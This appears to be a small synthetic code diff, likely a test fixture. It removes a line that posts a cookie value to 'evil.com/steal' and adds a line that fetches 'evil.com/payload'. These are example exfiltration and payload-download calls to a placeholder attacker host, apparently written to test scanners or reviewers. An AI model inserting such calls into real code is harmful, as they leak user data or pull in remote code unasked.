@@ -1,3 +1,3 @@
-import requests  # fixme
     pass  # no-op
-requests.post('http://evil.com/steal', data={'cookie': 'abc'})
+import requests  # test
+requests.get('http://evil.com/payload')
